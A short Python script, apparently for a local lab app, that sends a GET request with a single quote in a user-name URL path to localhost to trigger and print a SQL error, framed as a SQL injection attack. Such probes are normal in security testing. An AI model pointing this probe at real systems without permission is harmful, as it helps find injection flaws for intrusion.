#!/usr/bin/env python3
"""
SQL Injection Request Script

This script sends a GET request to a vulnerable endpoint with a single quote
in the URL path parameter to trigger a SQL injection vulnerability.

The script captures and prints the full HTTP response, including any HTML error
pages with SQL error messages and tracebacks.
"""

import requests
import sys

def perform_sql_injection(url="http://localhost:5002/users/v1/name1'"):
    """
    Performs a SQL injection attack by sending a GET request with a single quote
    in the URL path parameter.
    
    Args:
        url (str): The target URL with the SQL injection payload
                  Default is http://localhost:5002/users/v1/name1'
    
    Returns:
        str: The full HTTP response text
    
    Raises:
        requests.RequestException: If there's an error making the HTTP request
    """
    try:
        # Send the GET request to the vulnerable endpoint
        response = requests.get(url, timeout=10)
        
        # Return the full response text
        return response.text
    except requests.RequestException as e:
        print(f"Error making request: {e}", file=sys.stderr)
        sys.exit(1)

def main():
    """
    Main function to execute the SQL injection attack and print the response.
    """
    # Perform the SQL injection attack
    response_text = perform_sql_injection()
    
    # Print the full response exactly as received
    print(response_text)

if __name__ == "__main__":
    main()